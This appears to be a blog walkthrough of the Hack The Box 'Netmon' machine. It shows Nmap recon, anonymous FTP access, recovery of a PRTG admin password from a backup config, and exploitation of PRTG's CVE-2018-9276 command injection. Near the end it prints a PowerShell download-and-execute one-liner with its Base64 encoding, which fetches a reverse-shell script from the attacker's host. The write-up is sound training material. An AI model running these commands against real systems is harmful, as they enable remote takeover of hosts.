---
title: 'Netmon Walkthrough: Exploiting PRTG''s CVE-2018-9276'
date: 2024-11-03 11:40:00 +0530
categories:
- Capture the Flags
- Windows
tags:
- HTB
- ftp
- standalone
description: Walkthrough of HTB's Netmon machine
---
## Recon

To begin the reconnaissance phase, a full port scan was conducted using Nmap to identify open TCP ports on the target. The scan was optimized for speed and aimed at discovering all ports:

#### Explanation of Key Arguments:
- **`-T5`**: Maximizes scan speed.
- **`-sS`**: Conducts a SYN scan, initiating a TCP handshake without completing it for stealthiness.
- **`-n`**: Disables DNS resolution, reducing the time taken.
- **`-Pn`**: Skips host discovery, assuming the host is online.
- **`-p-`**: Scans all 65535 ports.

```
sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.10.152 --max-retries 0
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 11:53 EDT
Warning: 10.10.10.152 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.152
Host is up (0.047s latency).
Not shown: 33734 closed tcp ports (reset), 31791 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
```

### Aggressive Nmap Scan for Service and OS Detection
To gather additional information, we perform an aggressive scan. This includes OS detection, service version detection, and script scanning for potential vulnerabilities.:

```
sudo nmap -T5 -A -n -Pn --disable-arp-ping -p 21,80,135,139,445,5985,47001,49666,49667,49668 10.10.10.152 --max-retries 0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 11:57 EDT
Nmap scan report for 10.10.10.152
Host is up (0.13s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -12m35s, deviation: 0s, median: -12m35s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-31T15:46:01
|_  start_date: 2024-10-31T15:38:44
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
Since the HTTP port is open, I accessed it in a browser, which revealed a login page for the PRTG Network Monitor.
![image.png]({ '/assets/img/Netmon/image.png' | relative_url })

## FootHold & Privilege escalation

### Anonymous FTP Login

The target allows anonymous login via FTP, providing initial access.

```bash
$ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
```

### Listing Files

Once logged in, I listed the available files:

![Listing files]({ '/assets/img/Netmon/image%201.png' | relative_url })

### Fetching `user.txt`

I retrieved the `user.txt` file as part of the initial foothold:

![Fetching user.txt]({ '/assets/img/Netmon/image%202.png' | relative_url })

### PRTG Configuration Directory

PRTG Network Monitor stores its configuration files in the PRTG data directory on the core server system. By default, this directory is located at:

```bash
%programdata%\Paessler\PRTG Network Monitor
```

Navigating to this folder revealed a few interesting files, as shown below:

![Interesting files in directory]({ '/assets/img/Netmon/image%203.png' | relative_url })

### Downloading Configuration Files

I proceeded to download all files of interest:

![Downloading files]({ '/assets/img/Netmon/image%204.png' | relative_url })

### Searching for Credentials

I searched these configuration files for any credentials related to the default admin user, `prtgadmin`. While the “new” configuration files did not contain any useful information, I found a backup file that included a password for `prtgadmin`:

![Found credentials]({ '/assets/img/Netmon/image%205.png' | relative_url })

### Attempting Login

I tried logging into the PRTG Network Monitor web interface with the found credentials. However, the login was unsuccessful as the password appeared outdated.

Since the configuration file was last saved in 2018, I modified the password to `PrTg@dmin2019` and successfully logged in:

![Successful login]({ '/assets/img/Netmon/image%206.png' | relative_url })

### PRTG Network Monitor Version and Privileges

Once logged in, I noted that the machine was running PRTG Network Monitor version "18.1.37.13946" with possible administrative privileges.

According to CVE details and an excellent blog post by [Codewatch](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/):

> *An issue was discovered in PRTG Network Monitor before version 18.2.39. An attacker with access to the PRTG System Administrator web console with administrative privileges can exploit an OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.*

### Exploiting Command Injection Vulnerability

To exploit this, I navigated to the “Notifications” section under “Account Settings” in the “Setup” dropdown menu:

![Navigating to Notifications]({ '/assets/img/Netmon/image%207.png' | relative_url })

> 💡 **Vulnerability Note**: An argument supplied in the “Parameter” field of the “Notifications” configuration is passed directly into the PowerShell script without any sanitization, allowing an attacker to inject arbitrary PowerShell code.

### Setting Up the Reverse Shell Environment

To prepare for a reverse shell, I first created the PowerShell command for establishing the connection:

```bash
┌──(kali㉿kali)-[~/Red_Team/HTB]
└─$ echo 'Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.13 -Port 4444' >> /home/kali/Red_Team/Tools/Invoke-PowerShellTcp.ps1 
```

Next, I encoded the command to download and execute the reverse shell script, converting it to Base64 format:

```bash
┌──(kali㉿kali)-[~/Red_Team/HTB]
└─$ echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMwA6ADgAMAA4ADAALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA     
```

**iconv -t UTF-16LE**: This converts the text encoding of the PowerShell command to UTF-16LE (UTF-16 Little Endian), which is often required by Windows PowerShell for Base64-encoded commands. Windows PowerShell expects encoded commands in UTF-16LE, as it’s the default character encoding for PowerShell scripts.

**base64 -w0**: This takes the UTF-16LE encoded command and encodes it in Base64 format. The -w0 option ensures that the output is a single line without any line breaks, which is important for executing the encoded command smoothly.

### Modifying the Notification Parameter for Command Execution

I then modified the parameter in the Notifications configuration to download and execute “Invoke-PowerShellTcp,” effectively setting up a reverse shell:

![Modifying the parameter]({ '/assets/img/Netmon/image%208.png' | relative_url })

### Triggering the Shell

To initiate the reverse shell, I triggered the notification using the bell icon. This action executed the command and established a connection back to my listener, providing a shell with SYSTEM privileges.

![Catching the shell]({ '/assets/img/Netmon/image%209.png' | relative_url })

## References

- [CVE-2018-9276 on GitHub](https://github.com/A1vinSmith/CVE-2018-9276?tab=readme-ov-file)
- [CVE Details: CVE-2018-9276](https://www.cvedetails.com/cve/CVE-2018-9276/)
- [PRTG 18.2.39 Command Injection Vulnerability - Codewatch](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/)
